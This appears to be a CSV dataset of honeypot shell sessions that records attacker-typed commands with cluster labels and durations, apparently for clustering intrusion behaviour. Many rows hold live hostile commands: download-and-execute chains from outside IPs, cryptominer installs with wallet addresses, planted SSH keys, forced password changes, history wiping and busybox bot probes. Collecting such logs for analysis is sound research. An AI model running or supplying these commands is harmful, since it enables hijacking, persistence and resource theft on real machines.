session,SeededKmeans_result,Unnamed: 0,duration,command_freq,input
3229f796b1f0,1,15603,30.238337516784668,18,cat /proc/cpuinfo | grep name | wc -l
3229f796b1f0,1,15604,30.238337516784668,18,"echo -e ""lxd123\n1fHBZCxhL0ae\n1fHBZCxhL0ae""|passwd|bash"
3229f796b1f0,1,15605,30.238337516784668,18,Enter new UNIX password: 
3229f796b1f0,1,15606,30.238337516784668,18,Enter new UNIX password:
3229f796b1f0,1,15607,30.238337516784668,18,"echo ""lxd123\n1fHBZCxhL0ae\n1fHBZCxhL0ae\n""|passwd"
3229f796b1f0,1,15608,30.238337516784668,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
3229f796b1f0,1,15609,30.238337516784668,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
3229f796b1f0,1,15610,30.238337516784668,18,ls -lh $(which ls)
3229f796b1f0,1,15611,30.238337516784668,18,which ls
3229f796b1f0,1,15612,30.238337516784668,18,crontab -l
3229f796b1f0,1,15613,30.238337516784668,18,w
3229f796b1f0,1,15614,30.238337516784668,18,uname -m
3229f796b1f0,1,15615,30.238337516784668,18,cat /proc/cpuinfo | grep model | grep name | wc -l
3229f796b1f0,1,15616,30.238337516784668,18,top
3229f796b1f0,1,15617,30.238337516784668,18,uname
3229f796b1f0,1,15618,30.238337516784668,18,uname -a
3229f796b1f0,1,15619,30.238337516784668,18,lscpu | grep Model
3229f796b1f0,1,15620,30.238337516784668,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
da25c9981fd3,0,15621,3.645219564437866,13,enable
da25c9981fd3,0,15622,3.645219564437866,13,system
da25c9981fd3,0,15623,3.645219564437866,13,system
da25c9981fd3,0,15624,3.645219564437866,13,shell
da25c9981fd3,0,15625,3.645219564437866,13,shell
da25c9981fd3,0,15626,3.645219564437866,13,sh
da25c9981fd3,0,15627,3.645219564437866,13,cat /proc/mounts; /bin/busybox QWDFN
da25c9981fd3,0,15628,3.645219564437866,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QWDFN
da25c9981fd3,0,15629,3.645219564437866,13,tftp; wget; /bin/busybox QWDFN
da25c9981fd3,0,15630,3.645219564437866,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
da25c9981fd3,0,15631,3.645219564437866,13,while read i
da25c9981fd3,0,15632,3.645219564437866,13,/bin/busybox QWDFN
da25c9981fd3,0,15633,3.645219564437866,13,rm .s; exit
bb5446ead4c0,3,15634,1.2899160385131831,1,uname -a
d185934ad0dc,2,15635,182.41215705871585,1,curl -O http://45.90.161.105/systemd ; wget http://45.90.161.105/systemd ; chmod +x * ; ./systemd -o de.minexmr.com:443 -B -u 47Yz2np6PGzMw1u2WYpgW2Qv8WMfsy1dKLYsH9GMP9d5ZKZ6GqcGJ86YbKQ8t5MUFGHrA2j61QwNx9yD1oe2ek6DVptxdE7 -k --tls --rig-id ZTX1
0fda567e7dc9,2,15636,30.375574350357056,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.160.54/onion002; curl -O http://45.90.160.54/onion002; chmod 777 onion002; sh onion002; tftp 45.90.160.54 -c get onion002.sh; chmod 777 onion002.sh; sh onion002.sh; tftp -r .sh -g 45.90.160.54; chmod 777 onion002; sh onion002; ftpget -v -u anonymous -p anonymous -P 21 45.90.160.54 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
10bead0454cb,3,15637,1.367180347442627,1,uname -s -m
44b0442b5e00,3,15638,182.6324486732483,2,/ip cloud print
44b0442b5e00,3,15639,182.6324486732483,2,/ip cloud print
319e382222f3,0,15640,3.27133560180664,13,enable
319e382222f3,0,15641,3.27133560180664,13,system
319e382222f3,0,15642,3.27133560180664,13,system
319e382222f3,0,15643,3.27133560180664,13,shell
319e382222f3,0,15644,3.27133560180664,13,shell
319e382222f3,0,15645,3.27133560180664,13,sh
319e382222f3,0,15646,3.27133560180664,13,cat /proc/mounts; /bin/busybox LDNWE
319e382222f3,0,15647,3.27133560180664,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LDNWE
319e382222f3,0,15648,3.27133560180664,13,tftp; wget; /bin/busybox LDNWE
319e382222f3,0,15649,3.27133560180664,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
319e382222f3,0,15650,3.27133560180664,13,while read i
319e382222f3,0,15651,3.27133560180664,13,/bin/busybox LDNWE
319e382222f3,0,15652,3.27133560180664,13,rm .s; exit
99164f9d6872,0,15653,2.625378370285034,13,enable
99164f9d6872,0,15654,2.625378370285034,13,system
99164f9d6872,0,15655,2.625378370285034,13,system
99164f9d6872,0,15656,2.625378370285034,13,shell
99164f9d6872,0,15657,2.625378370285034,13,shell
99164f9d6872,0,15658,2.625378370285034,13,sh
99164f9d6872,0,15659,2.625378370285034,13,cat /proc/mounts; /bin/busybox ZIFTE
99164f9d6872,0,15660,2.625378370285034,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZIFTE
99164f9d6872,0,15661,2.625378370285034,13,tftp; wget; /bin/busybox ZIFTE
99164f9d6872,0,15662,2.625378370285034,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
99164f9d6872,0,15663,2.625378370285034,13,while read i
99164f9d6872,0,15664,2.625378370285034,13,/bin/busybox ZIFTE
99164f9d6872,0,15665,2.625378370285034,13,rm .s; exit
85e5aae06ae0,2,15666,60.29153060913086,1,wget 194.31.98.248/x86_64; chmod 777 x86_64; ./x86_64 wns.x86
c200b9ad3895,3,15667,1.040446043014526,1,uname -s -m
c5011082aeda,0,15668,3.41595458984375,13,enable
c5011082aeda,0,15669,3.41595458984375,13,system
c5011082aeda,0,15670,3.41595458984375,13,system
c5011082aeda,0,15671,3.41595458984375,13,shell
c5011082aeda,0,15672,3.41595458984375,13,shell
c5011082aeda,0,15673,3.41595458984375,13,sh
c5011082aeda,0,15674,3.41595458984375,13,cat /proc/mounts; /bin/busybox DFMFX
c5011082aeda,0,15675,3.41595458984375,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DFMFX
c5011082aeda,0,15676,3.41595458984375,13,tftp; wget; /bin/busybox DFMFX
c5011082aeda,0,15677,3.41595458984375,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
c5011082aeda,0,15678,3.41595458984375,13,while read i
c5011082aeda,0,15679,3.41595458984375,13,/bin/busybox DFMFX
c5011082aeda,0,15680,3.41595458984375,13,rm .s; exit
42e7c287bac6,2,15681,30.37676930427552,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.160.54/onion002; curl -O http://45.90.160.54/onion002; chmod 777 onion002; sh onion002; tftp 45.90.160.54 -c get onion002.sh; chmod 777 onion002.sh; sh onion002.sh; tftp -r .sh -g 45.90.160.54; chmod 777 onion002; sh onion002; ftpget -v -u anonymous -p anonymous -P 21 45.90.160.54 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
8c50176e39a4,0,15682,3.506605625152588,13,enable
8c50176e39a4,0,15683,3.506605625152588,13,system
8c50176e39a4,0,15684,3.506605625152588,13,system
8c50176e39a4,0,15685,3.506605625152588,13,shell
8c50176e39a4,0,15686,3.506605625152588,13,shell
8c50176e39a4,0,15687,3.506605625152588,13,sh
8c50176e39a4,0,15688,3.506605625152588,13,cat /proc/mounts; /bin/busybox BBHBB
8c50176e39a4,0,15689,3.506605625152588,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BBHBB
8c50176e39a4,0,15690,3.506605625152588,13,tftp; wget; /bin/busybox BBHBB
8c50176e39a4,0,15691,3.506605625152588,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
8c50176e39a4,0,15692,3.506605625152588,13,while read i
8c50176e39a4,0,15693,3.506605625152588,13,/bin/busybox BBHBB
8c50176e39a4,0,15694,3.506605625152588,13,rm .s; exit
ce31fb4695e8,0,15695,2.885741710662842,13,enable
ce31fb4695e8,0,15696,2.885741710662842,13,system
ce31fb4695e8,0,15697,2.885741710662842,13,system
ce31fb4695e8,0,15698,2.885741710662842,13,shell
ce31fb4695e8,0,15699,2.885741710662842,13,shell
ce31fb4695e8,0,15700,2.885741710662842,13,sh
ce31fb4695e8,0,15701,2.885741710662842,13,cat /proc/mounts; /bin/busybox DBXFA
ce31fb4695e8,0,15702,2.885741710662842,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DBXFA
ce31fb4695e8,0,15703,2.885741710662842,13,tftp; wget; /bin/busybox DBXFA
ce31fb4695e8,0,15704,2.885741710662842,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
ce31fb4695e8,0,15705,2.885741710662842,13,while read i
ce31fb4695e8,0,15706,2.885741710662842,13,/bin/busybox DBXFA
ce31fb4695e8,0,15707,2.885741710662842,13,rm .s; exit
2c0de9794001,3,15708,1.254080057144165,1,uname -s -m
14c4440d43c5,2,15709,44.646727085113525,1,"curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; wget https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh; sh setup_c3pool_miner.sh 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; echo -e ""xox0\nxox0"" | passwd"
1dc64a844d11,2,15710,51.40569067001343,1,"curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; wget https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh; sh setup_c3pool_miner.sh 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; echo -e ""xox0\nxox0"" | passwd"
18568f9d65f4,2,15711,60.33847379684448,1,wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main
a9c0ee1ebdee,2,15712,60.35819578170776,1,wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main
f02fd1eb0185,2,15713,1.28519582748413,1,cd /tmp ; wget http://208.115.245.158/c --no-check-certificate; curl -O http://208.115.245.158/c ; chmod 777 c* ; ./c ; rm -rf -c* ; history -c
3bd19efd0632,2,15714,195.5946033000946,1,cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://136.144.41.55/Saitama.sh; curl -O http://136.144.41.55/Saitama.sh; chmod 777 Saitama.sh; sh Saitama.sh; tftp 136.144.41.55 -c get tSaitama.sh; chmod 777 tSaitama.sh; sh tSaitama.sh; tftp -r tSaitama2.sh -g 136.144.41.55; chmod 777 tSaitama2.sh; sh tSaitama2.sh; ftpget -v -u anonymous -p anonymous -P 21 136.144.41.55 Saitama1.sh Saitama1.sh; sh Saitama1.sh; rm -rf Saitama.sh tSaitama.sh tSaitama2.sh Saitama1.sh; rm -rf *
e1ba7230f794,0,15715,2.04451584815979,13,enable
e1ba7230f794,0,15716,2.04451584815979,13,system
e1ba7230f794,0,15717,2.04451584815979,13,system
e1ba7230f794,0,15718,2.04451584815979,13,shell
e1ba7230f794,0,15719,2.04451584815979,13,shell
e1ba7230f794,0,15720,2.04451584815979,13,sh
e1ba7230f794,0,15721,2.04451584815979,13,cat /proc/mounts; /bin/busybox MTOSD
e1ba7230f794,0,15722,2.04451584815979,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MTOSD
e1ba7230f794,0,15723,2.04451584815979,13,tftp; wget; /bin/busybox MTOSD
e1ba7230f794,0,15724,2.04451584815979,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e1ba7230f794,0,15725,2.04451584815979,13,while read i
e1ba7230f794,0,15726,2.04451584815979,13,/bin/busybox MTOSD
e1ba7230f794,0,15727,2.04451584815979,13,rm .s; exit
ad63f198d451,0,15728,1.045769214630127,13,enable
ad63f198d451,0,15729,1.045769214630127,13,system
ad63f198d451,0,15730,1.045769214630127,13,system
ad63f198d451,0,15731,1.045769214630127,13,shell
ad63f198d451,0,15732,1.045769214630127,13,shell
ad63f198d451,0,15733,1.045769214630127,13,sh
ad63f198d451,0,15734,1.045769214630127,13,cat /proc/mounts; /bin/busybox RQQDP
ad63f198d451,0,15735,1.045769214630127,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RQQDP
ad63f198d451,0,15736,1.045769214630127,13,tftp; wget; /bin/busybox RQQDP
ad63f198d451,0,15737,1.045769214630127,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
ad63f198d451,0,15738,1.045769214630127,13,while read i
ad63f198d451,0,15739,1.045769214630127,13,/bin/busybox RQQDP
ad63f198d451,0,15740,1.045769214630127,13,rm .s; exit
72fbb70c9058,2,15741,60.25039219856262,1,wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main
32ef20e65090,2,15742,60.293067932128906,1,wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main
392dbc3d3cd3,2,15743,3.937946319580078,19,start
392dbc3d3cd3,2,15744,3.937946319580078,19,start
392dbc3d3cd3,2,15745,3.937946319580078,19,enable
392dbc3d3cd3,2,15746,3.937946319580078,19,config terminal
392dbc3d3cd3,2,15747,3.937946319580078,19,config terminal
392dbc3d3cd3,2,15748,3.937946319580078,19,system
392dbc3d3cd3,2,15749,3.937946319580078,19,system
392dbc3d3cd3,2,15750,3.937946319580078,19,linuxshell
392dbc3d3cd3,2,15751,3.937946319580078,19,linuxshell
392dbc3d3cd3,2,15752,3.937946319580078,19,su
392dbc3d3cd3,2,15753,3.937946319580078,19,shell
392dbc3d3cd3,2,15754,3.937946319580078,19,shell
392dbc3d3cd3,2,15755,3.937946319580078,19,sh
392dbc3d3cd3,2,15756,3.937946319580078,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
392dbc3d3cd3,2,15757,3.937946319580078,19,echo -ne \x45\x4c\x46
392dbc3d3cd3,2,15758,3.937946319580078,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
392dbc3d3cd3,2,15759,3.937946319580078,19,wget
392dbc3d3cd3,2,15760,3.937946319580078,19,echo -ne \x45\x4c\x46
392dbc3d3cd3,2,15761,3.937946319580078,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
9af184ceced6,3,15762,1.180756092071533,1,uname -s -m
a9e78aec616e,3,15763,1.973343610763549,1,cat /proc/uptime
bc0ad3fea808,2,15764,181.7724232673645,1,cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://136.144.41.55/Saitama.sh; curl -O http://136.144.41.55/Saitama.sh; chmod 777 Saitama.sh; sh Saitama.sh; tftp 136.144.41.55 -c get tSaitama.sh; chmod 777 tSaitama.sh; sh tSaitama.sh; tftp -r tSaitama2.sh -g 136.144.41.55; chmod 777 tSaitama2.sh; sh tSaitama2.sh; ftpget -v -u anonymous -p anonymous -P 21 136.144.41.55 Saitama1.sh Saitama1.sh; sh Saitama1.sh; rm -rf Saitama.sh tSaitama.sh tSaitama2.sh Saitama1.sh; rm -rf *
3a7b99ff756f,0,15765,2.643099069595337,13,enable
3a7b99ff756f,0,15766,2.643099069595337,13,system
3a7b99ff756f,0,15767,2.643099069595337,13,system
3a7b99ff756f,0,15768,2.643099069595337,13,shell
3a7b99ff756f,0,15769,2.643099069595337,13,shell
3a7b99ff756f,0,15770,2.643099069595337,13,sh
3a7b99ff756f,0,15771,2.643099069595337,13,cat /proc/mounts; /bin/busybox HRVZW
3a7b99ff756f,0,15772,2.643099069595337,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HRVZW
3a7b99ff756f,0,15773,2.643099069595337,13,tftp; wget; /bin/busybox HRVZW
3a7b99ff756f,0,15774,2.643099069595337,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
3a7b99ff756f,0,15775,2.643099069595337,13,while read i
3a7b99ff756f,0,15776,2.643099069595337,13,/bin/busybox HRVZW
3a7b99ff756f,0,15777,2.643099069595337,13,rm .s; exit
c1dd72312e54,2,15778,48.72066068649292,1,"curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; wget https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh; sh setup_c3pool_miner.sh 4ANkemPGmjeLPgLfyYupu2B8Hed2dy8i6XYF7ehqRsSfbvZM2Pz7bDeaZXVQAs533a7MUnhB6pUREVDj2LgWj1AQSGo2HRj; echo -e ""xox0\nxox0"" | passwd"
fdfbd7649637,0,15779,0.446779489517211,13,enable
fdfbd7649637,0,15780,0.446779489517211,13,system
fdfbd7649637,0,15781,0.446779489517211,13,system
fdfbd7649637,0,15782,0.446779489517211,13,shell
fdfbd7649637,0,15783,0.446779489517211,13,shell
fdfbd7649637,0,15784,0.446779489517211,13,sh
fdfbd7649637,0,15785,0.446779489517211,13,cat /proc/mounts; /bin/busybox VQJZQ
fdfbd7649637,0,15786,0.446779489517211,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VQJZQ
fdfbd7649637,0,15787,0.446779489517211,13,tftp; wget; /bin/busybox VQJZQ
fdfbd7649637,0,15788,0.446779489517211,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
fdfbd7649637,0,15789,0.446779489517211,13,while read i
fdfbd7649637,0,15790,0.446779489517211,13,/bin/busybox VQJZQ
fdfbd7649637,0,15791,0.446779489517211,13,rm .s; exit
729deff04468,0,15792,103.69404530525208,12,enable
729deff04468,0,15793,103.69404530525208,12,system
729deff04468,0,15794,103.69404530525208,12,system
729deff04468,0,15795,103.69404530525208,12,shell
729deff04468,0,15796,103.69404530525208,12,shell
729deff04468,0,15797,103.69404530525208,12,sh
729deff04468,0,15798,103.69404530525208,12,cat /proc/mounts; /bin/busybox SDEYX
729deff04468,0,15799,103.69404530525208,12,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SDEYX
729deff04468,0,15800,103.69404530525208,12,tftp; wget; /bin/busybox SDEYX
729deff04468,0,15801,103.69404530525208,12,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
729deff04468,0,15802,103.69404530525208,12,while read i
729deff04468,0,15803,103.69404530525208,12,/bin/busybox SDEYX
728bf4bbacba,0,15804,0.518276214599609,13,enable
728bf4bbacba,0,15805,0.518276214599609,13,system
728bf4bbacba,0,15806,0.518276214599609,13,system
728bf4bbacba,0,15807,0.518276214599609,13,shell
728bf4bbacba,0,15808,0.518276214599609,13,shell
728bf4bbacba,0,15809,0.518276214599609,13,sh
728bf4bbacba,0,15810,0.518276214599609,13,cat /proc/mounts; /bin/busybox XCUFX
728bf4bbacba,0,15811,0.518276214599609,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XCUFX
728bf4bbacba,0,15812,0.518276214599609,13,tftp; wget; /bin/busybox XCUFX
728bf4bbacba,0,15813,0.518276214599609,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
728bf4bbacba,0,15814,0.518276214599609,13,while read i
728bf4bbacba,0,15815,0.518276214599609,13,/bin/busybox XCUFX
728bf4bbacba,0,15816,0.518276214599609,13,rm .s; exit
9327ee43c0c7,2,15817,33.360634565353394,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.90.160.54/onion002; curl -O http://45.90.160.54/onion002; chmod 777 onion002; sh onion002; tftp 45.90.160.54 -c get onion002.sh; chmod 777 onion002.sh; sh onion002.sh; tftp -r .sh -g 45.90.160.54; chmod 777 onion002; sh onion002; ftpget -v -u anonymous -p anonymous -P 21 45.90.160.54 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
c08674a2c6a3,2,15818,15.27662229537964,19,start
c08674a2c6a3,2,15819,15.27662229537964,19,start
c08674a2c6a3,2,15820,15.27662229537964,19,enable
c08674a2c6a3,2,15821,15.27662229537964,19,config terminal
c08674a2c6a3,2,15822,15.27662229537964,19,config terminal
c08674a2c6a3,2,15823,15.27662229537964,19,system
c08674a2c6a3,2,15824,15.27662229537964,19,system
c08674a2c6a3,2,15825,15.27662229537964,19,linuxshell
c08674a2c6a3,2,15826,15.27662229537964,19,linuxshell
c08674a2c6a3,2,15827,15.27662229537964,19,su
c08674a2c6a3,2,15828,15.27662229537964,19,shell
c08674a2c6a3,2,15829,15.27662229537964,19,shell
c08674a2c6a3,2,15830,15.27662229537964,19,sh
c08674a2c6a3,2,15831,15.27662229537964,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
c08674a2c6a3,2,15832,15.27662229537964,19,echo -ne \x45\x4c\x46
c08674a2c6a3,2,15833,15.27662229537964,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
c08674a2c6a3,2,15834,15.27662229537964,19,wget
c08674a2c6a3,2,15835,15.27662229537964,19,echo -ne \x45\x4c\x46
c08674a2c6a3,2,15836,15.27662229537964,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
ef9fc01a6d89,0,15841,0.472712278366088,13,enable
ef9fc01a6d89,0,15842,0.472712278366088,13,system
ef9fc01a6d89,0,15843,0.472712278366088,13,system
ef9fc01a6d89,0,15844,0.472712278366088,13,shell
ef9fc01a6d89,0,15845,0.472712278366088,13,shell
ef9fc01a6d89,0,15846,0.472712278366088,13,sh
ef9fc01a6d89,0,15847,0.472712278366088,13,cat /proc/mounts; /bin/busybox SQEVB
ef9fc01a6d89,0,15848,0.472712278366088,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SQEVB
ef9fc01a6d89,0,15849,0.472712278366088,13,tftp; wget; /bin/busybox SQEVB
ef9fc01a6d89,0,15850,0.472712278366088,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
ef9fc01a6d89,0,15851,0.472712278366088,13,while read i
ef9fc01a6d89,0,15852,0.472712278366088,13,/bin/busybox SQEVB
ef9fc01a6d89,0,15853,0.472712278366088,13,rm .s; exit
d01acbe56f38,3,15854,4.454620122909546,1,uname -a
18e2418a3fca,3,15855,8.699441194534302,1,uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd;mkdir .ssh;cat .ssh/authorized_keys|grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/.auth_k;mv .ssh/.auth_k .ssh/authorized_keys
